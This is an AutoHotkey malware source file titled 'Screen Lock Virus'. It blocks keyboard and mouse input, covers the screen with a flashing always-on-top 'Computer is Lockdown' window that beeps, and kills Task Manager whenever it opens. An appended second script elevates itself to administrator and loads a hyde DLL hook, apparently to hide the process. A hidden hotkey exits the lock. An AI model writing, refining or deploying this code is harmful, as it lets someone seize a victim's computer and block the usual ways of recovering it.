/*
  Screen Lock Virus

  Description:-
	Locks The Computer Screen and randomly changes colors.
*/

#NoEnv
#SingleInstance Force
#Persistent
#NoTrayIcon

SetBatchLines -1 ;For Speed

; Blocks almost all kind of input - Keyboard & Mouse
BlockInput, On

;Gui Variables
Width	:=	A_ScreenWidth  + 20
Height	:=	A_ScreenHeight + 20

X	:=	(A_ScreenWidth  / 2) - 280
Y	:=	(A_ScreenHeight / 2) - 75

;Create a Gui
Gui -SysMenu +AlwaysOnTop +LastFound
Gui, Add, Picture, C:\Users\Wob\Desktop\Wob#8919\1.jpg
Gui Font, s50
Gui Add, Text, c000000 x%X% y%Y%, Computer is Lockdown
Gui Show, w%Width% h%Height%, Lock3d

WinSet, Transparent, 175, Lock3d

SetTimer, Check, 250
SetTimer, Color, 500

Return	 ;End of Auto Execute Section

Color:
	Random, Rand, -99999, 9999999
	Gui, Color, %Rand%
	Soundplay, *-1
Return

; A way of 'taking over' task manager
Check:
	if WinExist("Windows Task Manager")
	{
		WinKill, ahk_class #32770
		WinSet AlwaysOnTop, On, Lock3d
	}
Return

q & m::
Exitapp

#NoEnv
SetWorkingDir %A_ScriptDir%

OnExit, ExitSub

RunAsAdmin()

if ((A_Is64bitOS=1) && (A_PtrSize!=4))
	hMod := DllCall("LoadLibrary", Str, "hyde64.dll", Ptr)
else if ((A_Is32bitOS=1) && (A_PtrSize=4))
	hMod := DllCall("LoadLibrary", Str, "hyde.dll", Ptr)
Else
{
	MsgBox, Mixed Versions detected!`nOS Version and AHK Version need to be the same (x86 & AHK32 or x64 & AHK64).`n`nScript will now terminate!
	ExitApp
}

if (hMod)
{
	hHook := DllCall("SetWindowsHookEx", Int, 5, Ptr, DllCall("GetProcAddress", Ptr, hMod, AStr, "CBProc", ptr), Ptr, hMod, Ptr, 0, Ptr)
	if (!hHook)
	{
		MsgBox, SetWindowsHookEx failed!`nScript will now terminate!
		ExitApp
	}
}
else
{
	MsgBox, LoadLibrary failed!`nScript will now terminate!
	ExitApp
}

Return

RunAsAdmin()
{
	Global 0
	IfEqual, A_IsAdmin, 1, Return 0
	
	Loop, %0%
		params .= A_Space . %A_Index%
	
	DllCall("shell32\ShellExecute" (A_IsUnicode ? "":"A"),uint,0,str,"RunAs",str,(A_IsCompiled ? A_ScriptFullPath : A_AhkPath),str,(A_IsCompiled ? "": """" . A_ScriptFullPath . """" . A_Space) params,str,A_WorkingDir,int,1)
	ExitApp
}

ExitSub:
	if (hHook)
	{
		DllCall("UnhookWindowsHookEx", Ptr, hHook)
	}
	if (hMod)
	{
		DllCall("FreeLibrary", Ptr, hMod)
	}
ExitApp

